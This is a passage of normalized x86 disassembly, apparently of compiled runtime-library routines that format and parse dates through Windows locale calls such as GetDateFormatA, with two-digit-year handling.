mov dx [ esp + 0x16 ]
mov ax [ esp + 0x14 ]
call sub_40954c
fadd [ esp + 0x18 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x20
retn
sub_4099b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
fld [ ebx ]
call sub_402984
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
fild [ ebp - 0x8 ]
fstp [ ebx ]
fwait
fld [ ebx ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
fld [ ebp + 0x8 ]
call sub_402954
fabs
fsubr [ ebx ]
fstp [ ebx ]
fwait
fld [ ebp + 0x8 ]
call sub_402954
fabs
fadd [ ebx ]
fstp [ ebx ]
fwait
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409a18
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028f0
sub_409a5c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4041ac
mov edx eax
mov eax ebx
call sub_409a18
pop ecx
pop ebx
pop ebp
retn
sub_409a7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408884
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409a18
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ac8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409af4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409868
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409b2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_40958c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409b6c
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409cba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eec
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f84
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409cc1
lea eax [ ebp - 0x118 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40415c
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4041ac
mov edx eax
mov eax [ ebx ]
call sub_40c0fc
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c270
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_40440c
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c20c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4040e4
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c270
mov ecx eax
mov eax ebx
mov edx esi
call sub_403fdc
sub_409cd4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409db2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eec
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f84
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409db9
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40415c
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4041ac
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_40440c
sub_409ddc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a55d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a564
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f10
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c2f0
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c2d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409a18
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c2f0
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409a18
pop ecx
mov al [ eax + lookup_table_409ebf ]
jmp [ eax * 4 + jump_table_409ef8 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409af4
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409af4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409b6c
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409a5c
pop ecx
jmp r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409af4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409cd4
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409a5c
pop ecx
jmp r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409af4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ac8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409b2c
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409b2c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409b2c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409ac8
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409ac8
pop ecx
push ebp
call sub_409b2c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409b2c
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4086f4
test eax eax
jne r-xdata
push ebp
call sub_409ac8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ddc
pop ecx
push ebp
call sub_409b2c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409a7c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409a7c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409a7c
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409af4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409a7c
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409a7c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409a7c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ddc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ddc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409a7c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4086f4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409a18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ddc
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409a18
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409a18
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a5c
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409938
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a5c
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4086f4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409a18
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409a18
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409a5c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409938
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a5c
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c2f0
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4086f4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409a18
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ddc
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409a7c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4086f4
test eax eax
jne r-xdata
push ebp
call sub_409af4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409938
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a5c
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a5c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a5c
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c2f0
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409ddc
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409a18
pop ecx
jmp r-xdata
push ebp
call sub_409af4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409938
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409a5c
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4086f4
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4086f4
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4086f4
test eax eax
jne r-xdata
jmp r-xdata
sub_40a590
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409ddc
pop ecx
push ebp
mov eax ebx
call sub_409ddc
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403fdc
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a618
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4041ac
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a63c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a618
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4041ac
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a6d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a749
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a750
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a618
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4041ac
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_40440c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407e10
test eax eax
jne r-xdata
mov eax edi
call sub_4041ac
add [ esi ] eax
mov bl 0x1
sub_40a75c
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a618
mov eax esi
call sub_4041ac
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a794
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4041ac
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a7e0
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4041ac
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c334
mov [ ebx ] eax
jmp r-xdata
sub_40a828
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4043ac
push eax
mov eax [ ebx ]
call sub_4043ac
pop edx
call sub_40c3a8
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a87c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409a04
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a8d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40abf3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a794
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c370
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a63c
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a7e0
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_40440c
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407e80
mov eax [ ebp - 0x1c ]
call sub_40a828
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40abfa
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f10
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a75c
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a63c
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a75c
test al al
je r-xdata
call sub_409a04
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a63c
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409624
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4044f0
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a75c
mov edx ebx
mov eax esi
call sub_40a618
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4041ac
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a7e0
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a87c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a618
mov eax esi
call sub_4041ac
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409a04
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4041ac
